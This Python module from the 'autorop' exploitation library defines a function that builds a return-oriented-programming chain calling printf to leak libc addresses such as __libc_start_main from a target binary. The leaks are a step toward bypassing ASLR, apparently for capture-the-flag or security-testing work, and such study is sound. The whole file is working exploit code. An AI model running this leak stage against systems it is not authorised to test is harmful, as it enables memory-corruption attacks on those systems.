from autorop import PwnState, arutil, constants
from pwn import ROP
from typing import Iterable


def printf(
    short: bool = False, leak_symbols: Iterable[str] = ["__libc_start_main", "printf"]
) -> constants.TYPE_PIPE:
    """Leak libc addresses using ``printf``.

    This returns a function which opens a new target, and leaks
    the addresses of (by default) ``__libc_start_main`` and ``printf`` using ``printf``,
    placing them in ``state.leaks``.

    Arguments:
        short: Whether the attack should be minimised i.e. leak only one address.
        leak_symbols: What symbols should be leaked.

    Returns:
        Function which takes a state, and returns the Mutated ``PwnState``,
        with the following updated

            - ``target``: The fresh instance of target from which we got a successful leak.
              Hopefully it can still be interacted with.
            - ``leaks``: Updated with ``"symbol": address`` pairs for each
              function address of libc that was leaked.
    """
    if short:
        leak_symbols = [next(iter(leak_symbols))]

    def printf_instance(state: PwnState) -> PwnState:
        def leaker(rop: ROP, address: int) -> ROP:
            arutil.align_call(rop, "printf", [address])
            assert state._elf is not None
            # must send newline to satisfy ``arutil.leak_helper``
            arutil.align_call(rop, "printf", [next(state._elf.search(b"\n\x00"))])
            return rop

        return arutil.leak_helper(state, leaker, leak_symbols)

    return printf_instance
